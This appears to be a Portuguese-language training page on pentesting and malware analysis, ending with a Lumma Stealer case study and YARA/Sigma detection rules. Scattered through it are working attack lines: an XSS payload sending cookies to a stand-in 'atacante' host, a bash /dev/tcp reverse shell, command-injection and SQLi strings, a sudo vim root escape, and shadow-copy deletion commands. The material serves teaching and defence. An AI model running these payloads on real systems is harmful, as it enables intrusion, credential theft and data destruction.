🟢 Parte 1 — Fundamentos de Hacking & Pentest

Metodologia padrão, montagem de laboratório, varredura de redes, OWASP Top 10 e comandos essenciais.

Nível Iniciante

01 O que é Hacking & Metodologia de Pentest

Hacking é o processo de explorar sistemas para entender seu funcionamento em profundidade, encontrar falhas e (em contexto ético) corrigi-las. Há três classificações clássicas na comunidade:

  • White Hat: Hackers éticos que atuam sob contrato e autorização explícita.
  • Black Hat: Indivíduos que atuam de forma ilegal ou maliciosa para ganho pessoal/destruição.
  • Gray Hat: Intermediários que operam nas nuances — às vezes pesquisam sistemas sem autorização prévia, porém sem intenção destrutiva, reportando os achados aos responsáveis.

O trabalho do pentester profissional segue um ciclo de metodologia padronizado:

  1. Reconhecimento (Recon): Coleta passiva e ativa de informações sobre o alvo.
  2. Enumeração & Scanning: Mapeamento da superfície de ataque, portas, serviços e versões.
  3. Exploração: Obtenção do primeiro ponto de acesso (Initial Access).
  4. Pós-exploração: Escalação de privilégios (virar root/SYSTEM) e persistência.
  5. Movimentação Lateral & Pivoting: Expandir o alcance na rede interna.
  6. Relatório Técnico & Executivo: Documentar vulnerabilidades, impacto e remediações.
Tempo de leitura: ~3 min

02 Montando seu Laboratório Isolado

⚠️ REGRA DE OURO DA SEGURANÇA
Nunca execute ferramentas de varredura ou exploração contra sistemas reais de terceiros sem autorização prévia por escrito. Pratique exclusivamente dentro do seu ambiente virtualizado.

Para aprender com segurança e sem riscos para sua rede doméstica, monte um ambiente isolado:

  • Virtualizadores: VirtualBox ou VMware Workstation Player (ambos gratuitos).
  • Máquina Atacante: Kali Linux ou Parrot Security OS.
  • Máquinas Alvo Vulneráveis: Metasploitable 2/3, máquinas do VulnHub (ex.: DC-1), DVWA (Damn Vulnerable Web App) e OWASP Juice Shop.
  • Configuração de Rede: Configure os adaptadores de rede das VMs como Host-Only (Rede Interna) ou NAT Network isolada, garantindo que nenhum tráfego vaze para a internet.
Tempo de leitura: ~3 min

03 Reconhecimento, OSINT & Enumeração com Nmap

OSINT (Open Source Intelligence): Coleta de dados disponíveis publicamente sobre domínios e alvos.

  • theHarvester: Coleta e-mails, nomes de funcionários e subdomínios.
  • shodan.io / censys.io: Mecanismos de busca de dispositivos, servidores e câmeras expostas na internet.
  • Google Dorks: Operadores de busca avançados como site:alvo.com filetype:pdf ou intitle:"index of".

Scanning de Rede com Nmap: A ferramenta fundamental para descobrir portas e versões de serviços.

BASH — Comandos Essenciais do Nmap 
# 1. Descoberta de hosts ativos na subnet local
nmap -sn 192.168.1.0/24

# 2. Scan completo de todas as 65535 portas com versão (-sV), scripts padrão (-sC) e modo agressivo (-A)
nmap -sV -sC -p- -T4 -A 192.168.1.10 -oN scan_completo.txt

# 3. Scan rápido nas top 1000 portas mais comuns
nmap -sT --top-ports 1000 192.168.1.10

Portas Críticas Notáveis: 21 (FTP), 22 (SSH), 80/443 (HTTP/S), 445 (SMB), 3306 (MySQL), 3389 (RDP).

BASH — Enumeração de Serviços SMB & Web 
# Enumeração SMB (Windows/Samba)
enum4linux -a 192.168.1.10

# Fuzzing de diretórios ocultos em servidores Web
gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt

# Varredura de vulnerabilidades em servidor Web
nikto -h http://192.168.1.10
Tempo de leitura: ~5 min

04 Exploração de Vulnerabilidades Web (OWASP Top 10)

As vulnerabilidades web mais frequentes em aplicações modernas seguem os padrões do OWASP Top 10:

1. SQL Injection (SQLi)

Ocorre quando entradas de formulário são concatenadas diretamente em consultas SQL sem sanitização:

SQL / BASH — Bypass de Login e Automação com sqlmap 
# Exemplo de payload em campo de login
admin' OR '1'='1' --

# Automação completa de extração de banco com sqlmap
sqlmap -u "http://alvo/item.php?id=1" --dbs --batch

2. Cross-Site Scripting (XSS)

Injeção de JavaScript malicioso renderizado no navegador da vítima:

HTML / JS — Prova de Conceito de Exfiltração de Cookie 
<script>fetch('http://atacante/?c=' + document.cookie)</script>

3. Command Injection

Quando a aplicação passa parâmetros do usuário diretamente para o shell do sistema operacional:

BASH — Encadeamento de Comandos 
127.0.0.1; cat /etc/passwd
127.0.0.1 && whoami

4. Upload Irrestrito de Arquivos

Envio de scripts executáveis (como shell.php) mascarados com extensões alternativas (.phtml, .php5) ou alteração de Content-Type e Magic Bytes.

Tempo de leitura: ~5 min

05 Exploração de Serviços, Metasploit & Reverse Shells

O Metasploit Framework é o ecossistema mais utilizado no mundo para automação de testes de penetração e execução de payloads.

MSFCONSOLE — Fluxo Típico de Exploração 
msfconsole
msf6> search eternalblue
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> set RHOSTS 192.168.1.10
msf6> set LHOST 192.168.1.5
msf6> exploit

Reverse Shells Manuais

Em um reverse shell, o computador da vítima estabelece conexão de volta para o atacante, ultrapassando firewalls que bloqueiam conexões de entrada:

BASH — Netcat Listener & Payload Linux 
# 1. Na máquina do atacante: abrir escuta na porta 4444
nc -lvnp 4444

# 2. Na máquina alvo vulnerável (payload Bash)
bash -i >& /dev/tcp/192.168.1.5/4444 0>&1

# 3. Upgrade de shell básica para TTY interativa completa
python3 -c 'import pty; pty.spawn("/bin/bash")'
Tempo de leitura: ~4 min

06 Escalação de Privilégio (Linux Privilege Escalation)

Após obter acesso inicial com um usuário comum (como www-data), o objetivo é elevar privilégios para root.

BASH — Enumeração de Privilégios no Linux 
# Verificar comandos autorizados via sudo sem senha
sudo -l

# Localizar binários com bit SUID ativado
find / -perm -4000 2>/dev/null

# Inspecionar crontabs e tarefas agendadas do sistema
crontab -l; ls -la /etc/cron*

# Listar usuários com login de shell interativo
cat /etc/passwd | grep sh$

Ferramentas de Enumeração Automática: LinPEAS.sh, LinEnum.sh e pspy (para monitorar processos sem privilégios de root em tempo real).

Referência Fundamental: Consulte sempre o repositório GTFOBins para verificar abusos de binários do sistema com permissões SUID ou sudo.

Tempo de leitura: ~4 min

07 Escalação de Privilégio (Windows Privilege Escalation)

No Windows, a elevação de um usuário padrão para NT AUTHORITY\SYSTEM ou Administrator explora configurações errôneas:

  • Ferramentas Essenciais: winPEAS.bat / .exe, PowerUp.ps1 (da suíte PowerSploit) e windows-exploit-suggester.
  • Unquoted Service Path: Serviços com caminhos com espaços e sem aspas que permitem injeção de binários maliciosos na árvore de pastas.
  • Permissões Fracas em Serviços: Serviços com permissão de escrita permitindo alterar o binPath para apontar para um reverse shell.
  • AlwaysInstallElevated: Chaves de registro que autorizam pacotes MSI a instalarem com privilégios elevados de SYSTEM.
  • Privilégios Abusáveis: SeImpersonatePrivilege (vetor de ataques Rotten/Juicy/GodPotato).
Tempo de leitura: ~4 min

08 Quebra de Senhas & Hashes (John & Hashcat)

Diferença fundamental: John the Ripper e Hashcat realizam ataques offline de quebra de hashes com wordlists e regras matemáticas, enquanto Hydra executa força bruta online contra serviços de rede (SSH, FTP, HTTP).

BASH — John the Ripper & Hashcat 
# Unir /etc/passwd com /etc/shadow e quebrar com John the Ripper
unshadow passwd shadow > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Hashcat acelerado por GPU:
hashcat -m 0 -a 0 hashes.txt rockyou.txt         # Modo 0 = MD5
hashcat -m 1000 ntlm.txt rockyou.txt             # Modo 1000 = NTLM (Windows)
hashcat -m 22000 wifi.hcxpcapng rockyou.txt      # Modo 22000 = WPA/WPA2 Handshakes
Tempo de leitura: ~3 min

09 Ataques de Rede em Ambiente de Laboratório

Em ambientes de rede local (LAN) isolados:

  • ARP Spoofing: Envenenamento de tabela ARP para se posicionar como Man-in-the-Middle (MitM) com arpspoof ou Ettercap.
  • Sniffing & Análise: Captura de pacotes de rede com Wireshark e tcpdump.
  • Cracking WiFi WPA2: Captura de handshake 4-way via airodump-ng com desautenticação de clientes via aireplay-ng, seguido de quebra de senha via aircrack-ng.
  • Engenharia Social Simulada: Social-Engineer Toolkit (SET) — restrito unicamente a campanhas expressamente autorizadas.
Tempo de leitura: ~3 min

10 Criptografia Aplicada & Desafios CTF

Conceitos de criptografia aplicados a desafios de Capture The Flag (CTF):

  • Hashing: Funções unidirecionais (MD5, SHA-256). Senhas corporativas devem utilizar algoritmos lentos com salt como bcrypt ou Argon2.
  • Cifras Clássicas: Cifra de César, Vigenère, ROT13 e codificações Base64/Hexadecimal.
  • Ferramentas Essenciais: CyberChef (a "navalha suíça da web"), hashid, xxd.
  • Plataformas Recomendadas para Prática Legal: TryHackMe, HackTheBox, picoCTF e CTFtime.
Tempo de leitura: ~3 min

12 Um CTF Passo a Passo (Linux Beginner Box)

Simulação do fluxo completo de resolução em uma máquina estilo VulnHub / TryHackMe:

Etapa 1 — Descoberta de IP:

BASH
nmap -sn 192.168.1.0/24   # Encontrou: 192.168.1.50

Etapa 2 — Enumeração Completa:

BASH
nmap -sV -sC -A 192.168.1.50 -p- -oN full.txt
# Portas abertas: 22 (SSH), 80 (HTTP), 3306 (MySQL)

# Fuzzing de pastas na porta 80:
gobuster dir -u http://192.168.1.50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak

Etapa 3 — Exploração: Login vulnerável via SQLi ou credenciais vazadas em notas .bak permitindo acesso SSH.

Etapa 4 — Flag de Usuário & Escalação de Privilégio:

BASH
# Ver comandos sudo liberados:
sudo -l
# Se /usr/bin/vim estiver liberado sem senha:
sudo vim -c ':!/bin/sh'
# Agora você é root: cat /root/root.txt
Tempo de leitura: ~5 min

13 Active Directory — O Chefão Corporativo

Conceitos fundamentais da arquitetura de domínios corporativos Windows:

  • Domain Controller (DC): Servidor central que gerencia autenticação, usuários e políticas.
  • Kerberos: Protocolo de autenticação baseado em bilhetes (TGT e TGS).
  • NTLM: Autenticação legada baseada em hash, suscetível a ataques de Relay.
  • BloodHound: Mapeia grafos de relacionamento e caminhos curtos até Domain Admin.
Vetor de Ataque AD Descrição Ferramenta
AS-REP Roasting Contas com pré-autenticação Kerberos desabilitada GetNPUsers.py
Kerberoasting Solicitação de TGS de contas de serviço para quebra offline GetUserSPNs.py + Hashcat
Pass-the-Hash (PtH) Autenticação remota usando diretamente o hash NTLM impacket-psexec / CrackMapExec
NTLM Relay Redirecionar solicitações de autenticação capturadas Responder + ntlmrelayx
Abuso de ACLs Permissões excessivas (GenericAll, WriteDacl) em objetos PowerView / BloodHound
Tempo de leitura: ~6 min

14 Pivoting, Túneis & Movimentação Lateral

Quando você compromete um host na DMZ, outras redes internas ficam inacessíveis diretamente. O Pivoting roteia o tráfego do atacante através do host intermediário comprometido:

MSFCONSOLE & BASH — SOCKS Proxy & Proxychains 
# No Meterpreter:
meterpreter> run autoroute -s 10.0.1.0/24
meterpreter> background
msf6> use auxiliary/server/socks_proxy

# No Kali: usar proxychains para direcionar Nmap pela rede interna
proxychains nmap -sT -sV -Pn 10.0.1.20

Alternativas Modernas: Túneis SSH locais (ssh -L), ligolo-ng e chisel.

Tempo de leitura: ~4 min

15 Segurança em Nível Binário & Memória

Buffer Overflow (x86/x64): Ocorre quando uma entrada de dados excede o tamanho do buffer alocado na memória stack, sobrescrevendo ponteiros de instrução como o EIP ou RIP:

C — Exemplo Clássico de Vulnerabilidade de Memória
void vuln(char *input) {
    char buf[64];
    strcpy(buf, input);   // Sem validação de tamanho → estoura buffer
}

Mitigações Modernas: ASLR (Address Space Layout Randomization), DEP/NX (Data Execution Prevention), Stack Canaries e CFG.

Tempo de leitura: ~5 min

16 Hashes & Criptografia Aplicada com Regras

Identificação de hashes e técnicas de mutação:

BASH
# Identificar tipo de hash
hashid 'e99a18c428cb38d5f260853678922e03'

# Uso de regras do Hashcat para gerar permutações em wordlists (ex: leet speak, sufixos)
hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
Tempo de leitura: ~3 min

17 Hacking de Redes Sem Fio (WiFi)

Fluxo de auditoria sem fio no laboratório:

BASH — Fluxo Aircrack-ng
# 1. Ativar modo monitor no adaptador WiFi
airmon-ng start wlan0

# 2. Descobrir redes ao redor
airodump-ng wlan0mon

# 3. Capturar handshake no canal e BSSID alvo
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0mon

# 4. Desautenticar cliente para forçar handshake
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# 5. Quebrar a senha
aircrack-ng captura-01.cap -w rockyou.txt

Adaptadores Recomendados: Chipsets Atheros AR9271 ou Realtek RTL8812AU (suportam injeção de pacotes e modo monitor).

Tempo de leitura: ~4 min

18 Malware & Ofensiva Moderna (Conceitos para Defensores)

Como equipes de Red Team ético operam frameworks C2 e testam defesas:

  • Frameworks C2 Modernos: Sliver, Mythic, Havoc.
  • Evasão: AMSI bypass, ofuscação de scripts PowerShell e injeção em memória.
  • Mecanismos de Persistência: Run Keys no Registro, Tarefas Agendadas (Scheduled Tasks), Serviços do Windows e WMI Subscriptions.
  • MITRE ATT&CK: Matriz global de referência sobre táticas, técnicas e procedimentos (TTPs) de atacantes.
Tempo de leitura: ~4 min

19 Defesa: O Outro Lado da Moeda (Blue Team)

Aprender como atacar transforma você em um profissional de defesa incomparável:

  • Centralização de Logs & SIEM: ELK Stack, Wazuh, Splunk.
  • Detecção Comportamental: Regras Sigma e assinaturas YARA.
  • Threat Hunting: Busca ativa por anomalias e indicadores de comprometimento (IOCs) na rede.
  • Hardening Básico: CIS Benchmarks, segmentação de subnets, desativação de protocolos legados e autenticação multifator (MFA).
Tempo de leitura: ~4 min

21 Marcos Históricos da Cultura Hacker

  • 1971: Apito do cereal Cap'n Crunch emite 2600 Hz liberando troncos telefônicos (início do phreaking com John Draper).
  • 1988: Morris Worm derruba aproximadamente 10% de toda a internet da época.
  • 1999: Criação do padrão CVE para catalogação pública de falhas de segurança.
  • 2010: Stuxnet destrói centrífugas nucleares com extrema precisão cibernética.
  • 2016: Mirai Botnet escraviza câmeras e dispositivos IoT com senhas padrão para derrubar grandes serviços DNS.
  • 2017: WannaCry e NotPetya disseminam ransomware e wipers globalmente explorando o EternalBlue.
Tempo de leitura: ~3 min

22 Legislação Aplicada — Leitura Obrigatória

⚖️ LEGISLAÇÃO BRASILEIRA (CÓDIGO PENAL)
Artigo 154-A do Código Penal (Lei 12.737/2012 — Lei Carolina Dieckmann): Invadir dispositivo informático alheio, conectado ou não à rede de computadores, mediante violação indevida de mecanismo de segurança e sem autorização expressa ou tácita do titular do dispositivo para obter, adulterar ou destruir dados ou informações ou instalar vulnerabilidades.

Pena: Reclusão e multa. "Apenas testar" ou escanear sem permissão constitui crime formal. Pratique estritamente em plataformas autorizadas e laboratórios pessoais.
Tempo de leitura: ~3 min
🔴 Parte 3 — Análise de Malware & Engenharia Reversa

Entendendo detalhadamente o que acontece no sistema operacional quando códigos maliciosos são executados.

Nível Avançado

M1 O Ciclo de Vida de uma Execução Maliciosa

Quase toda família de malware moderna opera em um pipeline de 6 estágios sequenciais:

FLUXOGRAMA — Pipeline de Execução de Malware
EXECUÇÃO
   │
   ▼
[1] SOBREVIVÊNCIA INICIAL ─── Anti-VM, anti-debug, checagem de ambiente sandbox
   │                          (Sou uma VM? Devo executar ou dormir?)
   ▼
[2] ESTABELECIMENTO ────────── Descompacta payload real em memória, injeta em processo legítimo
   │
   ▼
[3] PERSISTÊNCIA ───────────── Garante sobrevivência a reboots (Run keys, tasks, WMI)
   │
   ▼
[4] C2 / COMUNICAÇÃO ──────── Beacon para servidor de comando e controle, recebe comandos
   │
   ▼
[5] CARGA ÚTIL ─────────────── Ação real: roubo de credenciais, cifragem, destruição
   │
   ▼
[6] LIMPEZA / ANTI-FORENSE ─── Apaga logs de eventos, shadow copies e históricos
Técnica Anti-Análise Como Funciona Como Neutralizar no Lab
IsDebuggerPresent API que verifica a flag PEB.BeingDebugged Patch de flag no depurador x64dbg / ScyllaHide
Checagem de Uptime / MAC Detecta se o sistema ligou há poucos segundos ou MAC VMware Configurar uptime real e mascarar endereço MAC
Sleep Estendido Chamada Sleep(0xFFFFFFF) para estourar timeout de sandbox Acelerar chamadas temporais com utilitários tipo Faketime
Tempo de leitura: ~5 min

M2 Malware que Destrói: Wipers

Diferente de ransowares, wipers não possuem chave de recuperação. Seu único propósito é a destruição irreversível dos dados:

  • Técnica A (Sobrescrita Direta): Abre arquivos em modo exclusivo e grava zeros ou bytes aleatórios sobre o conteúdo original antes de truncar o tamanho para 0.
  • Técnica B (Destruição de Estrutura de Disco): Sobrescreve o MBR/GPT ou a tabela $MFT do NTFS (Exemplos: Shamoon, NotPetya, HermeticWiper).
  • Técnica C (Destruição via APIs): Executa comandos para impedir recuperação do sistema:
    CMD / POWERSHELL
    vssadmin delete shadows /all /quiet
wbadmin delete catalog -quiet
bcdedit /set recoveryenabled No
Tempo de leitura: ~4 min

M3 Malware que Rouba: Infostealers

Os Infostealers (RedLine, Raccoon, Lumma, Vidar, Stealc) são comercializados como Malware-as-a-Service (MaaS). Em 2 a 5 minutos coletam:

  • Cookies & Senhas Salvas: Extraídos dos bancos SQLite do Chrome (Login Data), descriptografados via DPAPI na sessão do usuário.
  • Carteiras de Criptomoedas: Extensões de navegador (MetaMask, TrustWallet) e arquivos de carteiras desktop (Exodus).
  • Tokens de Sessão: Discord, Telegram Desktop (tdata) e Steam.
⚠️ O PERIGO DOS STEALERS "ONE-SHOT"
A maioria dos stealers encerra a execução e se auto-deleta sem criar persistência. O estrago, porém, é imediato e permanente: os tokens e cookies de sessão capturados permitem contornar senhas e autenticação de dois fatores (MFA) durante semanas.
Tempo de leitura: ~5 min

M4 Malware que Prende: Ransomware Passo a Passo

O modelo operacional dos grandes grupos de ransomware (LockBit, BlackCat):

  1. Acesso Inicial: Credenciais vazadas compradas em mercados underground ou VPNs sem MFA.
  2. Recon & Escalação: Mapeamento com BloodHound, Kerberoasting e dump de credenciais LSASS.
  3. Preparação & Dupla Extorsão: Exfiltração de gigabytes de dados sensíveis para a nuvem antes da cifragem, desativação de EDR via drivers vulneráveis (BYOVD) e exclusão de backups.
  4. Detonação em Massa: Disparo via GPO / PsExec para milhares de máquinas simultâneas, gerando chaves simétricas AES-256 por arquivo e cifrando a chave simétrica com chave pública assimétrica RSA-2048/4096.
Tempo de leitura: ~5 min

M5 Malware que Vigia: RATs, Keyloggers & Spyware

RATs (Remote Access Trojans): Ferramentas como Quasar, AsyncRAT e njRAT concedem controle total em tempo real (streaming de tela, microfone, gerenciador de arquivos e injeção de processos).

Técnicas de Keylogging: Ganchos de API do sistema (SetWindowsHookEx), leitura direta de buffers de kernel ou screenshots periódicos acoplados a OCR.

Tempo de leitura: ~4 min

M6 Malware de Sistema: Rootkits & Bootkits UEFI

  • Rootkits em Modo Usuário: Injeção de DLLs e interceptação de chamadas (API Hooking) para mascarar processos de listagens como o Gerenciador de Tarefas.
  • Rootkits de Kernel (Ring 0): Executam no nível mais privilegiado do processador abusando de drivers assinados vulneráveis (BYOVD — Bring Your Own Vulnerable Driver).
  • Bootkits UEFI: Infectam o firmware da placa-mãe (SPI Flash) iniciando antes do sistema operacional e contornando o Secure Boot (Exemplos: LoJax, MoonBounce, BlackLotus).
Tempo de leitura: ~4 min

M8 Montando seu Laboratório de Análise Seguro

Arquitetura recomendada para detonação segura de amostras:

  • VM de Análise Linux: REMnux com ferramentas pré-instaladas (Ghidra, Radare2, PEstudio, capa, YARA, INetSim).
  • VM Vítima Windows: Windows 10 limpo com suíte FlareVM instalada, Sysmon configurado e snapshots atualizados.
  • Simulador de Internet (INetSim): O REMnux responde requisições DNS/HTTP/SMTP localmente para que o malware acredite que está conectado à internet sem enviar dados para a rede real.
Tempo de leitura: ~4 min

M9 Análise Prática Passo a Passo & Produção de IOCs

Fluxo profissional de triagem e catalogação:

  1. Triagem Estática: Calcular SHA-256, inspecionar strings e rodar capa para identificar capacidades do binário sem executá-lo.
  2. Execução Controlada: Iniciar monitoramento simultâneo com Procmon, Wireshark e captura de memória RAM.
  3. Análise de Memória: Utilizar Volatility (windows.malfind e windows.dlllist).
  4. Geração do Relatório de IOCs: Documentar hashes, domínios C2, mutexes criados e chaves de persistência para alimentar defesas de SIEM.
Tempo de leitura: ~4 min

M10 Casos Reais Estudados (WannaCry, NotPetya, SolarWinds)

  • WannaCry (2017): Propagação automática como worm via EternalBlue (SMB). O registro de um domínio kill-switch hardcoded desacelerou a infecção global.
  • NotPetya (2017): Disseminado via supply chain no software fiscal M.E.Doc. Fingia ser ransomware, mas destruía irreversivelmente a estrutura do disco sem chave de recuperação.
  • SolarWinds SUNBURST (2020): Comprometimento do pipeline de build oficial (CI/CD), distribuindo malware assinado digitalmente para mais de 18.000 organizações.
  • BlackLotus (2023): Bootkit UEFI comercializado em fóruns que contorna o Secure Boot explorando a CVE-2023-24932.
Tempo de leitura: ~5 min

M11 Defesa Efetiva & Regras Sigma de Detecção

🟣 Parte 4 — Análise Guiada: Lumma Stealer (LummaC2)

Estudo prático completo do infostealer mais prolífico do mundo e seu desmantelamento global.

Case Real de Engenharia Reversa

L1 Contexto Operacional & A Operação Global de 2025

O Lumma Stealer (LummaC2) foi o infostealer mais ativo entre 2022 e 2025, operado como Malware-as-a-Service com painéis de afiliados. Foi desmantelado em maio de 2025 em operação internacional conjunta (Microsoft DCU + Europol + DOJ), com a derrubada de ~2.300 domínios de C2 ativos.

Vetores de Infecção Principais: Malvertising, falsos instaladores (Chrome/WhatsApp), campanhas ClickFix ("cole este comando no Executar/PowerShell"), links de cracks em vídeos do YouTube e EtherHiding (payloads ocultos em smart contracts da Binance Smart Chain).

Tempo de leitura: ~4 min

L2 Triagem Estática do Binário PE

Análise de características estruturais com pestudio e capa:

  • Entropia Alta (> 7.0): Indica que o payload está comprimido ou criptografado por um crypter stub.
  • Tabela de Importação Mínima: Apenas funções básicas de resolução dinâmica de APIs (VirtualAlloc, VirtualProtect, LoadLibraryA, GetProcAddress).
  • Detecção do capa: Identifica rotinas anti-debugging (IsDebuggerPresent), alocação de memória executável (RWX) e resolução de APIs por hashes customizados.
Tempo de leitura: ~4 min

L3 Análise Dinâmica & Desempacotamento com pe-sieve

Em vez de desconstruir manualmente algoritmos criptográficos complexos de crypters, execute o binário na VM de análise e deixe-o desempacotar o payload diretamente na memória RAM:

POWERSHELL / BASH — Extração com pe-sieve
# Na VM Windows: capturar blocos desempacotados da memória
pe-sieve64.exe /pid  /dir C:\lab\dump /imp 3

# No REMnux: inspecionar strings do binário desempacotado
strings -n 8 dumped.bin | grep -iE 'soft|chrom|gecko|wallet|Telegram'

Comportamento Típico no Procmon: Execução de taskkill /f /im chrome.exe para liberar locks dos bancos SQLite, leitura do arquivo Local State (chave DPAPI) e criação do arquivo ZIP temporário com os dados roubados.

Tempo de leitura: ~5 min

L4 Protocolo de Rede & Extração de Configuração C2

No tráfego de rede (Wireshark / INetSim), o Lumma utiliza um protocolo HTTP POST em 3 estágios característicos:

  1. /gate/getadmin.php: Handshake inicial com o painel para verificar se o IP da vítima deve ser processado.
  2. /gate/bot.php: Transmissão de telemetria básica da máquina infectada.
  3. /gate/logs.php: Upload do arquivo .zip protegido por senha contendo senhas, cookies e carteiras.
Tempo de leitura: ~4 min

L5 Relatório IOC & Mapeamento MITRE ATT&CK

Táticas e técnicas do MITRE identificadas na análise técnica:

  • T1027: Obfuscated / Packed Files
  • T1055: Process Injection
  • T1555.003: Credentials from Web Browsers
  • T1539: Steal Web Session Cookie
  • T1041: Exfiltration Over C2
  • T1070.001: Clear Windows Event Logs
Tempo de leitura: ~3 min

L6 Regras YARA & Detecção Comportamental Sigma

Regra YARA baseada em artefatos invariantes de memória e lógica de gate:

YARA — Regra Genérica para Lumma Stealer
rule Lumma_Stealer_Generic {
    meta:
        author = "OmniVoid Academy"
        description = "Detecta artefatos de memória e rotas de gate do Lumma Stealer"
    strings:
        $gate = "/gate/logs.php" ascii
        $tdata = "Telegram Desktop\\tdata" ascii
        $mm = "nkbihfbeogaeaoehlefnkodbefgpgknn" ascii   // ID da extensão MetaMask
        $lstate = "Local State" ascii
    condition:
        uint16(0) == 0x5A4D and 2 of them
}
YAML — Detecção Sigma Comportamental Correlacionada
title: Stealer - Matança de Navegador + Leitura de Login Data
logsource:
  product: windows
  service: sysmon
detection:
  sel_taskkill:
    EventID: 1
    Image|endswith: '\taskkill.exe'
    CommandLine|contains: '/im chrome.exe'
  sel_login:
    EventID: 11
    TargetFilename|contains: 'User Data\Default\Login Data'
  condition: sel_taskkill and (5s) sel_login
level: critical
Tempo de leitura: ~4 min

L7 Lições Fundamentais da Engenharia Reversa

💡 PRINCÍPIOS ESSENCIAIS PARA ANALISTAS
1. Empacotamento não é barreira: O próprio malware desempacota o payload na memória RAM; basta coletá-lo no ponto certo com ferramentas como pe-sieve.
2. A configuração é a joia da coroa: Domínios de C2 e protocolos de gate permitem mapear e derrubar a infraestrutura global inteira do grupo.
3. Comportamento supera hashes estáticos: Hashes mudam a cada compilação de crypter, mas o comportamento nos logs (matança de processos + leitura de DPAPI + POST de gate) permanece consistente.
4. A defesa real é arquitetural: Utilize chaves físicas FIDO2, autenticação sem senha e nunca armazene senhas sensíveis no navegador.
Tempo de leitura: ~3 min
